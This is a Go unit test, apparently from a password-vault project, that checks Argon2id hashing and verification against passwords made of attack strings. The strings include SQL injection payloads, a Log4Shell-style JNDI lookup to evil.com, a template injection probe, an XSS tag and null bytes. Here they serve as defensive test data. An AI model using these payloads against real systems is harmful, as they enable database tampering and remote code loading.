package attack

import (
	"testing"

	vaultcrypto "github.com/42-v/vault42/internal/crypto"
)

// TestArgon2idHandlesSpecialCharacters verifies that special characters
// (including SQL injection payloads) in passwords don't cause issues in the hashing layer.
func TestArgon2idHandlesSpecialCharacters(t *testing.T) {
	payloads := []string{
		"'; DROP TABLE users;--",
		`" OR 1=1; --`,
		"admin'--",
		"' UNION SELECT * FROM users WHERE '1'='1",
		"1; UPDATE users SET password='' WHERE email='admin@test.com",
		"${jndi:ldap://evil.com/x}",
		"{{7*7}}",
		"<script>alert(1)</script>",
		string([]byte{0x00, 0x01, 0x02, 0x03}), // null bytes
	}

	for _, payload := range payloads {
		t.Run(payload[:min(len(payload), 30)], func(t *testing.T) {
			// Should hash without error
			hash, err := vaultcrypto.HashPassword(payload)
			if err != nil {
				t.Fatalf("HashPassword failed on SQL payload: %v", err)
			}
			if hash == "" {
				t.Fatal("Empty hash returned")
			}

			// Should verify correctly
			valid, err := vaultcrypto.VerifyPassword(payload, hash)
			if err != nil {
				t.Fatalf("VerifyPassword failed: %v", err)
			}
			if !valid {
				t.Fatal("Valid password not verified")
			}

			// Wrong payload should not verify
			valid, _ = vaultcrypto.VerifyPassword("different", hash)
			if valid {
				t.Fatal("Wrong password verified as correct")
			}
		})
	}
}
